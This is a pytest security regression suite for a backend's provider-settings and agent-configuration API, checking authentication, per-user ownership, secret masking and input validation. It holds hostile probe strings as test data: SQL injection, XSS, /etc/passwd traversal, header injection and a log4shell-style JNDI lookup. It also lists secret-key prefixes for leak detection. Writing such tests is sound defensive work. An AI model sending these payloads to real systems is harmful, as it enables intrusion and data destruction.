"""КАО#VR-32/58/59 — Security regression tests for the model-capabilities /
thinking-config surface.

Round zone
----------
- GET  /api/settings/providers          — providers + per-model `model_capabilities`
                                           (thinking_effort_options, max_output_tokens).
- GET  /api/settings/providers/{p}/config — masked api_key + rate_limit.
- PUT  /api/settings/providers/{p}/config — set api_key / rate_limit.
- POST  /api/sessions/{id}/agents          — create/update agent_config (thinking_effort,
- PATCH /api/sessions/{id}/agents/{aid}      llm_model, llm_provider).

The four mandatory security classes for this zone:
  1. Auth/Authz — every settings + agent_config endpoint must reject unauthenticated
     requests (router-level Depends(require_auth)); agent_config mutation must enforce
     per-session ownership (User A cannot touch User B's session → 404).
  2. Input validation / injection — `thinking_effort` / `llm_model` / `llm_provider`
     strings must not be reflected verbatim into a place that breaks the response, and
     a hostile `thinking_effort` must never crash the capabilities/agent endpoints.
  3. Secrets / config leaks — the capabilities + provider responses must NEVER contain
     raw provider API keys, base_url-with-creds, or .env values. Only `api_key_set`
     (bool) and a *masked* key are allowed.
  4. Dependency CVEs — covered out-of-band via `npm audit` / `pip-audit` (see FINDINGS),
     not asserted here.

Run (inside the stage backend container)::

    docker compose exec backend python -m pytest backend/tests/test_kao_security_caps.py -v
    docker compose exec backend python -m pytest backend/tests/test_kao_security_caps.py -v -m e2e

Fixtures consumed (from conftest.py):
  - auth_client    : User A's authenticated httpx.Client (sync)
  - auth_client_b  : User B's authenticated httpx.Client (sync) — multitenancy
  - BACKEND_URL    : base URL for raw (unauthenticated) probes
"""
from __future__ import annotations

import json
import os
import uuid

import httpx
import pytest

# Same default the rest of the suite uses (conftest.py uses localhost:8000;
# test_security.py uses backend:8000). Honour BACKEND_URL either way.
BACKEND_URL = os.environ.get("BACKEND_URL", "http://localhost:8000")

pytestmark = [pytest.mark.asyncio, pytest.mark.e2e]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

# Substrings that must NEVER appear as a KEY in a capabilities/provider payload.
# (We check keys recursively; `api_key_set` / `api_key_masked` are explicitly
# allow-listed because they are booleans / masked strings, never the raw key.)
_FORBIDDEN_KEY_SUBSTRINGS = ("api_key", "secret", "token", "password", "passwd", "credential")
# КАО#VR-59 — `max_tokens` / `max_output_tokens` legitimately contain the
# substring "token" but are not secrets; allow-list them so the secret-key
# scanner doesn't false-positive on the capabilities / agent_config shape.
_ALLOWED_SECRET_KEYS = {"api_key_set", "api_key_masked", "max_tokens", "max_output_tokens"}

# Literal secret-value prefixes that must never appear anywhere in a response body.
_SECRET_VALUE_NEEDLES = (
    "sk-ant-", "sk-proj-", "sk-or-", "gsk_", "xai-", "AIza",
    "postgresql://", "postgres://", "redis://",
    "ANTHROPIC_API_KEY", "OPENAI_API_KEY", "GOOGLE_API_KEY", "GROK_API_KEY",
)


def _assert_no_secret_keys(obj, path: str = "") -> None:
    """Recursively assert no dict key looks like a raw secret holder.

    Allows the documented booleans/masked fields (`api_key_set`,
    `api_key_masked`) — those are safe by design — but fails on any key such as
    `api_key`, `secret`, `token`, `password` that could carry a raw value.
    """
    if isinstance(obj, dict):
        for key, value in obj.items():
            key_l = str(key).lower()
            if key_l not in _ALLOWED_SECRET_KEYS:
                for bad in _FORBIDDEN_KEY_SUBSTRINGS:
                    assert bad not in key_l, (
                        f"secret-like key {key!r} at {path or '<root>'} "
                        f"(matched {bad!r})"
                    )
            _assert_no_secret_keys(value, f"{path}.{key}")
    elif isinstance(obj, list):
        for i, item in enumerate(obj):
            _assert_no_secret_keys(item, f"{path}[{i}]")


def _assert_no_secret_values(raw_text: str, where: str) -> None:
    for needle in _SECRET_VALUE_NEEDLES:
        assert needle not in raw_text, f"{where} leaks secret-looking value {needle!r}"


def _skip_if_auth_disabled(status_code: int) -> None:
    """Several auth tests are no-ops when the env runs with auth disabled.

    In dev mode (no SMTP / API key / ALLOWED_EMAILS) the router-level
    Depends(require_auth) returns None and unauthenticated requests succeed.
    Mirror test_security.py: skip rather than fail in that configuration.
    """
    if status_code not in (401, 403):
        pytest.skip("auth appears disabled in this environment (got non-401)")


def _user_b_or_skip(auth_client_b) -> None:
    if auth_client_b is None:
        pytest.skip("auth_client_b fixture not available — set up second test user")


# ===========================================================================
# CLASS 3 — Secrets / config leaks (capabilities + provider responses)
# ===========================================================================

async def test_providers_capabilities_response_has_no_secret_keys(
    auth_client: httpx.Client,
) -> None:
    """GET /api/settings/providers (the model_capabilities surface, VR-32/58/59)
    must expose models + capabilities but NEVER a raw api_key / secret / token.
    """
    r = auth_client.get("/api/settings/providers")
    assert r.status_code == 200, r.text
    body = r.json()

    assert "providers" in body, body
    # Structural sanity: each provider carries the capability surface, not secrets.
    for prov in body["providers"]:
        assert "name" in prov
        assert "models" in prov
        assert "model_capabilities" in prov
        # `configured` / `available` are the only allowed booleans derived from
        # whether a key is set — the key itself must not be present.
        assert "api_key" not in prov, f"raw api_key in provider {prov.get('name')!r}"

    # No secret-like KEYS anywhere in the structure.
    _assert_no_secret_keys(body, "providers")
    # No secret-like VALUES anywhere in the serialized body.
    _assert_no_secret_values(r.text, "/api/settings/providers")


async def test_model_capabilities_shape_is_safe(auth_client: httpx.Client) -> None:
    """`model_capabilities[model]` only carries thinking/limit metadata.

    Guards against a regression where the capability dict accidentally starts
    forwarding provider internals (api_key, base_url, headers).
    """
    r = auth_client.get("/api/settings/providers")
    assert r.status_code == 200, r.text
    for prov in r.json()["providers"]:
        caps = prov.get("model_capabilities") or {}
        assert isinstance(caps, dict)
        for model_id, mc in caps.items():
            assert isinstance(mc, dict), f"{prov['name']}/{model_id} caps not a dict"
            # Whatever keys exist, none may look like a secret.
            for key in mc:
                key_l = str(key).lower()
                if key_l in _ALLOWED_SECRET_KEYS:  # КАО#VR-59 — max_output_tokens etc. are not secrets
                    continue
                for bad in _FORBIDDEN_KEY_SUBSTRINGS:
                    assert bad not in key_l, (
                        f"capability key {key!r} for {prov['name']}/{model_id} "
                        f"looks secret"
                    )
            # If thinking is advertised, it must be a list of short tokens.
            opts = mc.get("thinking_effort_options")
            if opts is not None:
                assert isinstance(opts, list)
                assert all(isinstance(o, str) and len(o) <= 16 for o in opts)


async def test_app_settings_response_has_no_secret_keys(
    auth_client: httpx.Client,
) -> None:
    """GET /api/settings/ (llm_providers status) must not leak raw keys either."""
    r = auth_client.get("/api/settings/")
    assert r.status_code == 200, r.text
    body = r.json()
    _assert_no_secret_keys(body, "settings")
    _assert_no_secret_values(r.text, "/api/settings/")
    # Provider status uses api_key_set (bool), never the key itself.
    for prov in body.get("llm_providers", []):
        assert isinstance(prov.get("api_key_set"), bool)
        assert "api_key" not in {k for k in prov if k != "api_key_set"}


async def test_provider_config_returns_masked_key_only(
    auth_client: httpx.Client,
) -> None:
    """GET /api/settings/providers/{p}/config must mask the key.

    The endpoint may return `api_key_masked` (e.g. ``sk-a****wxyz``) but the
    raw, unmasked key must never appear — verified by ensuring the value, if
    present, contains the masking character and no known secret prefix.
    """
    r = auth_client.get("/api/settings/providers/openai/config")
    assert r.status_code == 200, r.text
    body = r.json()
    # Only ever the masked form + a boolean.
    assert set(body.keys()) <= {
        "provider", "api_key_masked", "api_key_set", "rate_limit",
    }, f"unexpected keys in provider config: {body.keys()}"
    masked = body.get("api_key_masked", "")
    if masked:
        # A masked key either is fully masked or contains the mask char.
        assert "*" in masked, f"api_key_masked not actually masked: {masked!r}"
    _assert_no_secret_values(r.text, "/api/settings/providers/openai/config")


async def test_openapi_schema_has_no_capability_secret_leak() -> None:
    """The generated OpenAPI schema for the settings routes must not embed
    example secrets (defense-in-depth for the new capabilities models)."""
    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=10.0) as client:
        r = await client.get("/openapi.json")
    assert r.status_code == 200
    _assert_no_secret_values(r.text, "/openapi.json")


# ===========================================================================
# CLASS 1 — Auth: unauthenticated requests must be rejected
# ===========================================================================

async def test_providers_capabilities_requires_auth() -> None:
    """GET /api/settings/providers without a token must 401 (router-level auth)."""
    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=10.0) as client:
        r = await client.get("/api/settings/providers")
    _skip_if_auth_disabled(r.status_code)
    assert r.status_code == 401, r.text
    # And the unauthenticated error body must not leak secrets either.
    _assert_no_secret_values(r.text, "unauth /api/settings/providers")


async def test_app_settings_requires_auth() -> None:
    """GET /api/settings/ without a token must 401."""
    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=10.0) as client:
        r = await client.get("/api/settings/")
    _skip_if_auth_disabled(r.status_code)
    assert r.status_code == 401, r.text


async def test_provider_config_get_requires_auth() -> None:
    """GET /api/settings/providers/{p}/config without a token must 401.

    This endpoint reads stored key material (masked) — it must be protected.
    """
    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=10.0) as client:
        r = await client.get("/api/settings/providers/openai/config")
    _skip_if_auth_disabled(r.status_code)
    assert r.status_code == 401, r.text


async def test_provider_config_put_requires_auth() -> None:
    """PUT /api/settings/providers/{p}/config without a token must 401.

    Critical: this WRITES the provider API key. An unauthenticated write would
    let anyone replace our credentials (or set a key that exfiltrates prompts).
    """
    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=10.0) as client:
        r = await client.put(
            "/api/settings/providers/openai/config",
            json={"api_key": "sk-attacker-injected-key-123456"},
        )
    _skip_if_auth_disabled(r.status_code)
    assert r.status_code == 401, r.text


async def test_test_llm_endpoint_requires_auth() -> None:
    """POST /api/settings/test-llm without a token must 401 (could burn cycles /
    probe internal network)."""
    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=10.0) as client:
        r = await client.post(
            "/api/settings/test-llm",
            json={"provider": "openai", "model": "gpt-4o"},
        )
    _skip_if_auth_disabled(r.status_code)
    assert r.status_code == 401, r.text


async def test_agent_config_list_requires_auth() -> None:
    """GET /api/sessions/{id}/agents without a token must 401."""
    fake_sid = str(uuid.uuid4())
    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=10.0) as client:
        r = await client.get(f"/api/sessions/{fake_sid}/agents")
    _skip_if_auth_disabled(r.status_code)
    assert r.status_code == 401, r.text


async def test_agent_config_create_requires_auth() -> None:
    """POST /api/sessions/{id}/agents without a token must 401."""
    fake_sid = str(uuid.uuid4())
    async with httpx.AsyncClient(base_url=BACKEND_URL, timeout=10.0) as client:
        r = await client.post(
            f"/api/sessions/{fake_sid}/agents",
            json={
                "agent_type": "coder",
                "llm_provider": "openai",
                "llm_model": "gpt-4o",
                "thinking_effort": "high",
            },
        )
    _skip_if_auth_disabled(r.status_code)
    assert r.status_code == 401, r.text


# ===========================================================================
# CLASS 1 — Authz: per-session ownership on agent_config mutation
# ===========================================================================

async def test_user_a_cannot_create_agent_on_user_b_session(
    auth_client: httpx.Client, auth_client_b: httpx.Client
) -> None:
    """User A POSTing an agent_config to User B's session must 404 (not 200/403)."""
    _user_b_or_skip(auth_client_b)
    create = auth_client_b.post(
        "/api/sessions/",
        json={"name": "caps-authz-create-b", "specification": "noop"},
    )
    assert create.status_code in (200, 201), create.text
    b_id = create.json()["id"]
    try:
        r = auth_client.post(
            f"/api/sessions/{b_id}/agents",
            json={
                "agent_type": "coder",
                "agent_index": 0,
                "llm_provider": "openai",
                "llm_model": "gpt-4o",
                "thinking_effort": "high",
            },
        )
        assert r.status_code == 404, (
            f"User A could write agent_config to User B's session: {r.status_code} {r.text}"
        )
    finally:
        auth_client_b.delete(f"/api/sessions/{b_id}")


async def test_user_a_cannot_list_agents_on_user_b_session(
    auth_client: httpx.Client, auth_client_b: httpx.Client
) -> None:
    """User A listing agent_configs on User B's session must 404 (no config leak)."""
    _user_b_or_skip(auth_client_b)
    create = auth_client_b.post(
        "/api/sessions/",
        json={"name": "caps-authz-list-b", "specification": "noop"},
    )
    b_id = create.json()["id"]
    try:
        r = auth_client.get(f"/api/sessions/{b_id}/agents")
        assert r.status_code == 404, r.text
    finally:
        auth_client_b.delete(f"/api/sessions/{b_id}")


async def test_user_a_cannot_patch_agent_on_user_b_session(
    auth_client: httpx.Client, auth_client_b: httpx.Client
) -> None:
    """User A PATCHing an agent_config that lives on User B's session must 404,
    and B's config must be unchanged (no thinking_effort/model takeover)."""
    _user_b_or_skip(auth_client_b)
    create = auth_client_b.post(
        "/api/sessions/",
        json={"name": "caps-authz-patch-b", "specification": "noop"},
    )
    b_id = create.json()["id"]
    try:
        # B creates a known agent_config on its own session.
        add = auth_client_b.post(
            f"/api/sessions/{b_id}/agents",
            json={
                "agent_type": "coder",
                "agent_index": 0,
                "llm_provider": "anthropic",
                "llm_model": "claude-sonnet-4-5",
                "thinking_effort": "low",
            },
        )
        if add.status_code not in (200, 201):
            pytest.skip(f"could not seed agent_config for B: {add.status_code} {add.text}")
        agent_id = add.json()["id"]

        # A tries to hijack it (note: agent_id is B's). Ownership is checked on
        # the *session*, so this must 404 regardless of the agent id.
        r = auth_client.patch(
            f"/api/sessions/{b_id}/agents/{agent_id}",
            json={"thinking_effort": "high", "llm_model": "attacker-model"},
        )
        assert r.status_code == 404, (
            f"User A could PATCH agent_config on User B's session: {r.status_code} {r.text}"
        )

        # Confirm B's config was untouched.
        listed = auth_client_b.get(f"/api/sessions/{b_id}/agents")
        assert listed.status_code == 200, listed.text
        configs = listed.json()
        mine = [c for c in configs if c["id"] == agent_id]
        assert mine, "B's agent_config disappeared"
        assert mine[0]["thinking_effort"] == "low", "A mutated B's thinking_effort"
        assert mine[0]["llm_model"] == "claude-sonnet-4-5", "A mutated B's llm_model"
    finally:
        auth_client_b.delete(f"/api/sessions/{b_id}")


async def test_user_a_cannot_delete_agent_on_user_b_session(
    auth_client: httpx.Client, auth_client_b: httpx.Client
) -> None:
    """User A DELETEing an agent_config on User B's session must 404; it survives."""
    _user_b_or_skip(auth_client_b)
    create = auth_client_b.post(
        "/api/sessions/",
        json={"name": "caps-authz-delete-b", "specification": "noop"},
    )
    b_id = create.json()["id"]
    try:
        add = auth_client_b.post(
            f"/api/sessions/{b_id}/agents",
            json={
                "agent_type": "coder",
                "agent_index": 0,
                "llm_provider": "openai",
                "llm_model": "gpt-4o",
            },
        )
        if add.status_code not in (200, 201):
            pytest.skip(f"could not seed agent_config for B: {add.status_code}")
        agent_id = add.json()["id"]

        r = auth_client.delete(f"/api/sessions/{b_id}/agents/{agent_id}")
        assert r.status_code == 404, r.text

        # Still there for B.
        listed = auth_client_b.get(f"/api/sessions/{b_id}/agents").json()
        assert any(c["id"] == agent_id for c in listed), "A deleted B's agent_config"
    finally:
        auth_client_b.delete(f"/api/sessions/{b_id}")


# ===========================================================================
# CLASS 2 — Input validation / injection via thinking_effort / llm_* strings
# ===========================================================================

# Hostile strings: SQLi, XSS, path-traversal, oversized token, control chars.
_HOSTILE_EFFORTS = [
    "'; DROP TABLE agent_configs;--",
    "<script>alert(1)</script>",
    "../../../../etc/passwd",
    "high\nX-Injected-Header: evil",   # CRLF/log-injection probe
    "A" * 5000,                         # oversized
    "${jndi:ldap://evil/x}",            # log4shell-style marker
]


@pytest.mark.parametrize("evil", _HOSTILE_EFFORTS)
async def test_thinking_effort_hostile_string_is_handled_safely(
    auth_client: httpx.Client, evil: str
) -> None:
    """A hostile `thinking_effort` on agent_config create must not 500.

    Current behaviour: `thinking_effort` is typed `str | None` with no
    server-side whitelist, so the API accepts it (200/201) and stores it. The
    provider layer maps it defensively via ``effort_map.get(effort, default)``
    so the raw string never reaches the LLM API/headers. What we assert here is
    the security-relevant invariant: **no 500, and the value round-trips as an
    inert string** (it is not executed, not reflected into a different field,
    and not silently turned into a privileged value).

    If a future hardening rejects unknown efforts with 422, that's strictly
    better — accept it too.
    """
    create = auth_client.post(
        "/api/sessions/",
        json={"name": f"caps-inj-{uuid.uuid4().hex[:6]}", "specification": "noop"},
    )
    assert create.status_code in (200, 201), create.text
    sid = create.json()["id"]
    try:
        r = auth_client.post(
            f"/api/sessions/{sid}/agents",
            json={
                "agent_type": "coder",
                "agent_index": 0,
                "llm_provider": "openai",
                "llm_model": "gpt-4o",
                "thinking_effort": evil,
            },
        )
        # The one hard requirement: never a server error (no SQLi/template
        # explosion / unhandled exception).
        assert r.status_code != 500, f"hostile thinking_effort caused 500: {r.text}"
        assert r.status_code in (200, 201, 422), r.text
        if r.status_code in (200, 201):
            body = r.json()
            # Stored verbatim and inert (proves it wasn't interpreted as SQL/HTML
            # nor mapped to a privileged sentinel like "max").
            assert body.get("thinking_effort") == evil, (
                f"thinking_effort mutated on store: {body.get('thinking_effort')!r}"
            )
            # Must not have bled into another field.
            assert body.get("llm_model") == "gpt-4o"
            assert body.get("llm_provider") == "openai"
    finally:
        auth_client.delete(f"/api/sessions/{sid}")


async def test_agent_config_unknown_provider_rejected_on_create(
    auth_client: httpx.Client,
) -> None:
    """AgentConfigCreate.validate_provider must reject an unknown llm_provider.

    This is the documented whitelist on *create*. Injecting an arbitrary
    provider string (which would later be used to dispatch to a provider class)
    must 422, not be accepted.
    """
    create = auth_client.post(
        "/api/sessions/",
        json={"name": f"caps-prov-{uuid.uuid4().hex[:6]}", "specification": "noop"},
    )
    assert create.status_code in (200, 201), create.text
    sid = create.json()["id"]
    try:
        r = auth_client.post(
            f"/api/sessions/{sid}/agents",
            json={
                "agent_type": "coder",
                "agent_index": 0,
                "llm_provider": "evil-provider'; DROP TABLE x;--",
                "llm_model": "gpt-4o",
            },
        )
        assert r.status_code == 422, (
            f"unknown llm_provider was accepted on create: {r.status_code} {r.text}"
        )
    finally:
        auth_client.delete(f"/api/sessions/{sid}")


async def test_agent_config_patch_unknown_provider_behaviour(
    auth_client: httpx.Client,
) -> None:
    """КАО#VR-59 (was a MINOR finding, now FIXED): AgentConfigUpdate now has the
    same provider whitelist as AgentConfigCreate, so a PATCH with a bogus
    llm_provider is rejected (422), not silently stored. Previously the update
    schema's llm_provider was a bare ``str | None`` with no validator (a
    create/update asymmetry).
    """
    create = auth_client.post(
        "/api/sessions/",
        json={"name": f"caps-patchprov-{uuid.uuid4().hex[:6]}", "specification": "noop"},
    )
    assert create.status_code in (200, 201), create.text
    sid = create.json()["id"]
    try:
        add = auth_client.post(
            f"/api/sessions/{sid}/agents",
            json={
                "agent_type": "coder",
                "agent_index": 0,
                "llm_provider": "openai",
                "llm_model": "gpt-4o",
            },
        )
        assert add.status_code in (200, 201), add.text
        agent_id = add.json()["id"]

        r = auth_client.patch(
            f"/api/sessions/{sid}/agents/{agent_id}",
            json={"llm_provider": "evil-provider", "llm_model": "../../x"},
        )
        # КАО#VR-59 — the update schema now whitelists llm_provider, so a bogus
        # provider is rejected (422). (Still never a 500.)
        assert r.status_code != 500, f"PATCH bogus provider caused 500: {r.text}"
        assert r.status_code == 422, r.text
    finally:
        auth_client.delete(f"/api/sessions/{sid}")


async def test_agent_config_create_response_has_no_secrets(
    auth_client: httpx.Client,
) -> None:
    """The agent_config create/list responses must not carry provider secrets.

    agent_config stores llm_provider/llm_model (public), never the key — assert
    the response surface stays clean as this zone evolves.
    """
    create = auth_client.post(
        "/api/sessions/",
        json={"name": f"caps-nosec-{uuid.uuid4().hex[:6]}", "specification": "noop"},
    )
    assert create.status_code in (200, 201), create.text
    sid = create.json()["id"]
    try:
        add = auth_client.post(
            f"/api/sessions/{sid}/agents",
            json={
                "agent_type": "coder",
                "agent_index": 0,
                "llm_provider": "anthropic",
                "llm_model": "claude-sonnet-4-5",
                "thinking_effort": "medium",
            },
        )
        assert add.status_code in (200, 201), add.text
        _assert_no_secret_keys(add.json(), "agent_config")
        _assert_no_secret_values(add.text, "agent_config create response")

        listed = auth_client.get(f"/api/sessions/{sid}/agents")
        assert listed.status_code == 200, listed.text
        _assert_no_secret_values(listed.text, "agent_config list response")
    finally:
        auth_client.delete(f"/api/sessions/{sid}")
